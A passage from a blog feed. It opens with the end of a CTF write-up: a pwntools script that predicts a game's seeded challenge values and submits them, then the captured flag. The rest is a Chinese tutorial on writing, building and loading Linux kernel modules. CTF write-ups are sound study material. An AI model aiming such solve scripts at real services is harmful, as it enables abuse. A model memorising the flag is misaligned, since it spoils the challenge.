class="subst">&#123;v2[<span class="number">1</span>]&#125;</span> &quot;</span>)</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">if</span> v2[<span class="number">0</span>] == v1[<span class="number">0</span>] <span class="keyword">and</span> v2[<span class="number">1</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">                info(<span class="string">&quot;correct&quot;</span>)</span><br><span class="line">                pause()</span><br><span class="line">                seed_correct = <span class="literal">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> seed_correct == <span class="literal">False</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    info(<span class="string">f&#x27;answer: <span class="subst">&#123;answer&#125;</span>&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;submit your score&#x27;</span>, answer)</span><br><span class="line">    <span class="comment"># break</span></span><br><span class="line">    <span class="comment"># p.sendlineafter(&#x27;submit your score&#x27;, &quot;submit&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>flag: <code>ZJUCTF&#123;5aK1-CHan&#39;s_k0k0r0_ls_5m4sh3d_oTATo&#125;</code></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>LKM编程</title>
    <url>/posts/79c0f484.html</url>
    <content><![CDATA[<h2 id="Chapter-1-Introduction"><a href="#Chapter-1-Introduction" class="headerlink" title="Chapter 1. Introduction"></a>Chapter 1. Introduction</h2><h3 id="1-1-What-Is-A-Kernel-Module"><a href="#1-1-What-Is-A-Kernel-Module" class="headerlink" title="1.1. What Is A Kernel Module?"></a>1.1. What Is A Kernel Module?</h3><p><strong>Linux系统内核：</strong>宏内核（与微内核相对），使用内核模块实现动态模块的加载运行。</p>
<table>
<thead>
<tr>
<th></th>
<th>简介</th>
<th>优点</th>
<th>缺点</th>
</tr>
</thead>
<tbody><tr>
<td>宏内核</td>
<td>将进程调度核心功能，驱动程序，网络协议、文件系统都放入内核态</td>
<td>效率高</td>
<td>一个出错就崩溃</td>
</tr>
<tr>
<td>微内核</td>
<td>只将核心功能放在内核态，其他放在用户态以进程形式运行</td>
<td>驱动程序出错不影响内核运行</td>
<td>效率低</td>
</tr>
</tbody></table>
<p><strong>LKM：</strong>用于扩展内核的功能，运行在内核态，为ELF二进制文件，如果不使用内核模块，会导致需要给内核添加功能时只能重新编译整个内核，不是很方便。</p>
<h3 id="1-2-How-Do-Modules-Get-Into-The-Kernel"><a href="#1-2-How-Do-Modules-Get-Into-The-Kernel" class="headerlink" title="1.2. How Do Modules Get Into The Kernel?"></a>1.2. How Do Modules Get Into The Kernel?</h3><p>使用<code>lsmod</code>命令查看已经加载到内核的模块（<code>/proc/modules</code>）。</p>
<p>使用<code>modprobe</code>命令加载指定模块到内核（自动查询模块的依赖关系进行加载<code>/lib/modules/version/kernel/*/*.ko</code>）</p>
<p>使用<code>insmod</code>命令加载模块到内核，不会查询依赖关系（<code>modprobe</code>调用该命令）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insmod /lib/modules/2.6.11/kernel/fs/fat/fat.ko</span><br><span class="line">insmod /lib/modules/2.6.11/kernel/fs/msdos/msdos.ko</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">modprobe msdos</span><br></pre></td></tr></table></figure>

<p><strong>华为路由器LKM列表</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@debian-mips:~# lsmod</span><br><span class="line">Module                  Size  Used by</span><br><span class="line">msdos                   7642  0 </span><br><span class="line">fat                    54395  1 msdos</span><br><span class="line">ipv6                  312786  12 </span><br><span class="line">loop                   13153  0 </span><br><span class="line">mtdchar                 7769  0 </span><br><span class="line">cfi_cmdset_0001        26278  1 </span><br><span class="line">cfi_probe               3224  0 </span><br><span class="line">gen_probe               2353  1 cfi_probe</span><br><span class="line">sg                     30552  0 </span><br><span class="line">uhci_hcd               26706  0 </span><br><span class="line">cfi_util                4778  2 cfi_cmdset_0001,cfi_probe</span><br><span class="line">ehci_hcd               49012  0 </span><br><span class="line">physmap                 2637  0 </span><br><span class="line">sr_mod                 16338  0 </span><br><span class="line">i2c_piix4               5936  0 </span><br><span class="line">mtd                    18073  6 mtdchar,cfi_cmdset_0001,physmap</span><br><span class="line">8139too                20824  0 </span><br><span class="line">psmouse                53122  0 </span><br><span class="line">usbcore               152780  3 uhci_hcd,ehci_hcd</span><br><span class="line">chipreg                 1474  2 cfi_probe,physmap</span><br><span class="line">cdrom                  38519  1 sr_mod</span><br><span class="line">i2c_core               18515  1 i2c_piix4</span><br><span class="line">8139cp                 20460  0 </span><br><span class="line">serio_raw               4416  0 </span><br><span class="line">map_funcs               1034  1 physmap</span><br><span class="line">evdev                   8808  0 </span><br><span class="line">nls_base                6015  2 fat,usbcore</span><br></pre></td></tr></table></figure>



<h2 id="Chapter2-Hello-World"><a href="#Chapter2-Hello-World" class="headerlink" title="Chapter2.Hello World"></a>Chapter2.Hello World</h2><h3 id="2-1-Hello-World-part-1-The-Simplest-Module"><a href="#2-1-Hello-World-part-1-The-Simplest-Module" class="headerlink" title="2.1. Hello, World (part 1): The Simplest Module"></a>2.1. Hello, World (part 1): The Simplest Module</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-1.c - The simplest kernel module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello world 1.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * A non 0 return means init_module failed; module can&#x27;t be loaded. </span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">cleanup_module</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye world 1.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>必须至少有两个函数:一个名为<code>init module()</code>的“开始”(初始化)函数，它在模块被<code>insmod</code>时被调用;一个名为<code>cleanup module()</code>的“结束”(清理)函数，它在模块被<code>rmmod</code>之前被调用。</p>
<p>在内核版本2.3后可以不这么命名加载时入口函数为使用<code>module_init</code>指定入口函数，卸载时使用<code>module_exit</code>指定卸载函数。</p>
<p>【报错】：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ sudo insmod ./hello-1.ko                                     </span><br><span class="line">insmod: ERROR: could not insert module ./hello-1.ko: Invalid module format</span><br><span class="line">~/Documents/LKM/writeup/code                                   Py base 09:24:36</span><br><span class="line">❯ sudo dmesg | grep modules</span><br><span class="line">[  715.059773] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line">[ 1165.465487] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line"></span><br><span class="line">❯ sudo insmod ./hello-1.ko                                     </span><br><span class="line">insmod: ERROR: could not insert module ./hello-1.ko: Invalid module format</span><br><span class="line">~/Documents/LKM/writeup/code                                   Py base 09:24:36</span><br><span class="line">❯ sudo dmesg | grep modules</span><br><span class="line">[  715.059773] module: x86/modules: Skipping invalid relocation target, existing value is nonzero for type 1, loc 000000000fc2cc28, val ffffffffc0cb4040</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">solution 注：如果重装的不是<span class="built_in">uname</span> -r显示的版本，需要指定</span></span><br><span class="line">sudo apt update &amp;&amp; sudo apt upgrade</span><br><span class="line">sudo apt remove --purge linux-headers-*</span><br><span class="line">sudo apt autoremove &amp;&amp; sudo apt autoclean</span><br><span class="line">sudo apt install linux-headers-generic</span><br></pre></td></tr></table></figure>



<h4 id="2-1-1-PrintK（）"><a href="#2-1-1-PrintK（）" class="headerlink" title="2.1.1 PrintK（）"></a>2.1.1 PrintK（）</h4><p>注：打印函数与Printf函数不同（应用程序可以调用C标准库，但内核函数一般调用自己提供的函数）</p>
<p>printk函数可以用来进行内核调试，其可以打印信息到终端或日志中，打印信息分为几个等级。</p>
<p>【附：除Printk外的一些打印内核信息的函数】</p>
<img src="/posts/79c0f484/image-20240104200604418.png" class="" title="image-20240104200604418">

<h3 id="2-2-编译内核模块"><a href="#2-2-编译内核模块" class="headerlink" title="2.2 编译内核模块"></a>2.2 编译内核模块</h3><p>使用Makefile进行编译</p>
<p>Makefile：指定内核源码，编译参数，编译平台</p>
<figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">obj-m += hello-1.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<p>编译生成*.ko文件，即为内核模块。</p>
<img src="/posts/79c0f484/image-20240104171023339.png" class="" title="image-20240104171023339">

<p>使用<code>modinfo hello-1.ko</code>查看模块信息。</p>
<img src="/posts/79c0f484/image-20240104171137803.png" class="" title="image-20240104171137803">

<p>加载模块到内核<code>insmod ./hello-1.ko</code></p>
<h4 id="模块的加载流程"><a href="#模块的加载流程" class="headerlink" title="模块的加载流程"></a>模块的加载流程</h4><ul>
<li>驱动程序注册设备，创建系统信息（<code>/sys/class/xxx</code>）</li>
<li>注册设备使用的是模块文件名，要带.ko后缀</li>
<li>当操作已插入内核的模块时，只需使用模块名</li>
<li>udev|mdev根据注册的设备信息，创建设备节点（<code>/dev/xxx</code>）</li>
<li>所有设备节点信息存储在<code>/proc/devices</code></li>
<li>加载后会输出模块内的加载信息，通过<code>dmesg</code>查看</li>
</ul>
<h4 id="init-module系统调用流程"><a href="#init-module系统调用流程" class="headerlink" title="init_module系统调用流程"></a>init_module系统调用流程</h4><ul>
<li>不依赖C库。链接&#x2F;重定位自己完成</li>
<li>Kernel&#x2F;module.c&#x2F;init_module</li>
<li>拷贝到内核：copy_module_from_user</li>
<li>地址空间分配：layout_and_allocate</li>
<li>符号解析：simplify_symbols</li>
<li>重定位:apply_relocations</li>
<li>执行：complete_formation</li>
</ul>
<h3 id="2-3-Hello-World-part-2"><a href="#2-3-Hello-World-part-2" class="headerlink" title="2.3 Hello World (part 2)"></a>2.3 Hello World (part 2)</h3><p>可以使用<code>module_init(hello_2_init);</code> <code>module_exit(hello_2_exit);</code>函数指定入口函数和退出函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-2.c - Demonstrating the module_init() and module_exit() macros.</span></span><br><span class="line"><span class="comment"> *  This is preferred over using init_module() and cleanup_module().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_2_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 2\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_2_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 2\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_2_init);</span><br><span class="line">module_exit(hello_2_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-4-Hello-World-part-3-init-and-exit宏定义"><a href="#2-4-Hello-World-part-3-init-and-exit宏定义" class="headerlink" title="2.4 Hello World (part 3):  __init and _exit宏定义"></a>2.4 Hello World (part 3):  __init and _exit宏定义</h3><p>__init宏导致一旦内置驱动程序的init函数完成，init函数就会被丢弃并释放其内存（对Loadable modules无效）</p>
<p>__exit宏导致函数遗漏，（对Loadable Modules无效）内置驱动程序不需要cleanup函数，但Loadable Modules需要。</p>
<p>以下代码定义了init, initdata, exit宏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-3.c - Illustrating the __init, __initdata and __exit macros.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> hello3_data __initdata = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_3_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world %d\n&quot;</span>, hello3_data);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_3_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 3\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_3_init);</span><br><span class="line">module_exit(hello_3_exit);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Rita Roseweisse&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>修改Makefile，编译加载内核，查看记录信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 2774.912662] Hello, world 3</span><br></pre></td></tr></table></figure>

<h3 id="2-5-Hello-World-part-4-Licensing-and-Module-Documentation"><a href="#2-5-Hello-World-part-4-Licensing-and-Module-Documentation" class="headerlink" title="2.5 Hello World (part 4): Licensing and Module Documentation"></a>2.5 Hello World (part 4): Licensing and Module Documentation</h3><ul>
<li>Licensing：使用<code>MODULE_LICENSE()</code>宏定义。<code>GPL</code>代表模块开源免费</li>
<li>Description：使用<code>MODULE_DESCRIPTION</code>宏定义。描述模块用于做什么。</li>
<li>Author：使用<code>MODULE_AUTHOR</code>宏定义。描述作者</li>
<li>支持设备：<code>MODULE_SUPPORTED_DEVICE()</code></li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  hello-4.c - Demonstrates module documentation.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span>	<span class="comment">/* Needed by all modules */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span>	<span class="comment">/* Needed for KERN_INFO */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span>		<span class="comment">/* Needed for the macros */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_AUTHOR <span class="string">&quot;Peter Jay Salzman &lt;p@dirac.org&gt;&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DRIVER_DESC   <span class="string">&quot;A sample driver&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">init_hello_4</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 4\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">cleanup_hello_4</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 4\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(init_hello_4);</span><br><span class="line">module_exit(cleanup_hello_4);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  You can use strings, like this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Get rid of taint message by declaring code as GPL. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Or with defines, like this:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_AUTHOR(DRIVER_AUTHOR);	<span class="comment">/* Who wrote this module? */</span></span><br><span class="line">MODULE_DESCRIPTION(DRIVER_DESC);	<span class="comment">/* What does this module do */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  </span></span><br><span class="line"><span class="comment"> *  This module uses /dev/testdevice.  The MODULE_SUPPORTED_DEVICE macro might</span></span><br><span class="line"><span class="comment"> *  be used in the future to help automatic configuration of modules, but is </span></span><br><span class="line"><span class="comment"> *  currently unused other than for documentation purposes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MODULE_SUPPORTED_DEVICE(<span class="string">&quot;testdevice&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="2-6-向内核模块传递命令行参数"><a href="#2-6-向内核模块传递命令行参数" class="headerlink" title="2.6 向内核模块传递命令行参数"></a>2.6 向内核模块传递命令行参数</h3><p>需要将要传入参数的变量声明为全局变量，并且使用module_param()宏定义。运行时，insmod会将命令行参数传入。<code>./insmod mymodule.ko myvariable=5**</code></p>
<p>module_param()宏接受3个参数：变量名，类型，对应文件</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> myint = <span class="number">3</span>;</span><br><span class="line">module_param(myint, <span class="type">int</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>数组变量格式稍有不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> myintarray[<span class="number">2</span>];</span><br><span class="line">module_param_array(myintarray, <span class="type">int</span>, <span class="literal">NULL</span>, <span class="number">0</span>); <span class="comment">/* not interested in count */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> myshortarray[<span class="number">4</span>];</span><br><span class="line"><span class="type">int</span> count;</span><br><span class="line">module_parm_array(myshortarray, <span class="type">short</span>, , <span class="number">0</span>); <span class="comment">/* put count into &quot;count&quot; variable */</span></span><br></pre></td></tr></table></figure>

<p><code>MODULE_PARM_DESC()</code>记录模块接受的参数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> *  hello-5.c - Demonstrates command line argument passing to a module.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;Peter Jay Salzman&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">short</span> <span class="type">int</span> myshort = <span class="number">1</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myint = <span class="number">420</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="type">int</span> mylong = <span class="number">9999</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *mystring = <span class="string">&quot;blah&quot;</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> myintArray[<span class="number">2</span>] = &#123; <span class="number">-1</span>, <span class="number">-1</span> &#125;;</span><br><span class="line"><span class="type">static</span> <span class="type">int</span> arr_argc = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * module_param(foo, int, 0000)</span></span><br><span class="line"><span class="comment"> * The first param is the parameters name</span></span><br><span class="line"><span class="comment"> * The second param is it&#x27;s data type</span></span><br><span class="line"><span class="comment"> * The final argument is the permissions bits, </span></span><br><span class="line"><span class="comment"> * for exposing parameters in sysfs (if non-zero) at a later stage.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">module_param(myshort, <span class="type">short</span>, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);</span><br><span class="line">MODULE_PARM_DESC(myshort, <span class="string">&quot;A short integer&quot;</span>);</span><br><span class="line">module_param(myint, <span class="type">int</span>, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);</span><br><span class="line">MODULE_PARM_DESC(myint, <span class="string">&quot;An integer&quot;</span>);</span><br><span class="line">module_param(mylong, <span class="type">long</span>, S_IRUSR);</span><br><span class="line">MODULE_PARM_DESC(mylong, <span class="string">&quot;A long integer&quot;</span>);</span><br><span class="line">module_param(mystring, charp, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(mystring, <span class="string">&quot;A character string&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * module_param_array(name, type, num, perm);</span></span><br><span class="line"><span class="comment"> * The first param is the parameter&#x27;s (in this case the array&#x27;s) name</span></span><br><span class="line"><span class="comment"> * The second param is the data type of the elements of the array</span></span><br><span class="line"><span class="comment"> * The third argument is a pointer to the variable that will store the number </span></span><br><span class="line"><span class="comment"> * of elements of the array initialized by the user at module loading time</span></span><br><span class="line"><span class="comment"> * The fourth argument is the permission bits</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">module_param_array(myintArray, <span class="type">int</span>, &amp;arr_argc, <span class="number">0000</span>);</span><br><span class="line">MODULE_PARM_DESC(myintArray, <span class="string">&quot;An array of integers&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">hello_5_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> i;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Hello, world 5\n=============\n&quot;</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;myshort is a short integer: %hd\n&quot;</span>, myshort);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;myint is an integer: %d\n&quot;</span>, myint);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;mylong is a long integer: %ld\n&quot;</span>, mylong);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;mystring is a string: %s\n&quot;</span>, mystring);</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; (<span class="keyword">sizeof</span> myintArray / <span class="keyword">sizeof</span> (<span class="type">int</span>)); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;myintArray[%d] = %d\n&quot;</span>, i, myintArray[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;got %d arguments for myintArray.\n&quot;</span>, arr_argc);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">hello_5_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;Goodbye, world 5\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_5_init);</span><br><span class="line">module_exit(hello_5_exit);</span><br></pre></td></tr></table></figure>

<p>编译生成的模块<code>hello_5</code>基本信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">modinfo hello-5.ko</span><br><span class="line">filename:       /home/bronya/Documents/LKM/writeup/code/hello-5.ko</span><br><span class="line">author:         Peter Jay Salzman</span><br><span class="line">license:        GPL</span><br><span class="line">srcversion:     A704327C32F7F311666C13C</span><br><span class="line">depends:        </span><br><span class="line">retpoline:      Y</span><br><span class="line">name:           hello_5</span><br><span class="line">vermagic:       6.2.0-37-generic SMP preempt mod_unload modversions </span><br><span class="line">parm:           myshort:A short integer (short)</span><br><span class="line">parm:           myint:An integer (int)</span><br><span class="line">parm:           mylong:A long integer (long)</span><br><span class="line">parm:           mystring:A character string (charp)</span><br><span class="line">parm:           myintArray:An array of integers (array of int)</span><br></pre></td></tr></table></figure>

<p>加载模块显示信息：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[ 4659.140006] hello_5: unknown parameter &#x27;mybyte&#x27; ignored</span><br><span class="line">[ 4659.140047] Hello, world 5</span><br><span class="line">               =============</span><br><span class="line">[ 4659.140048] myshort is a short integer: 1</span><br><span class="line">[ 4659.140049] myint is an integer: 420</span><br><span class="line">[ 4659.140049] mylong is a long integer: 9999</span><br><span class="line">[ 4659.140050] mystring is a string: bebop</span><br><span class="line">[ 4659.140050] myintArray[0] = -1</span><br><span class="line">[ 4659.140051] myintArray[1] = -1</span><br><span class="line">[ 4659.140051] got 1 arguments for myintArray.</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-7-多文件编译模块"><a href="#2-7-多文件编译模块" class="headerlink" title="2.7 多文件编译模块"></a>2.7 多文件编译模块</h3><p>可以将内核模块分为多个源文件</p>
<p>例：一个模块分为start，stop，将入口函数和退出函数分离</p>
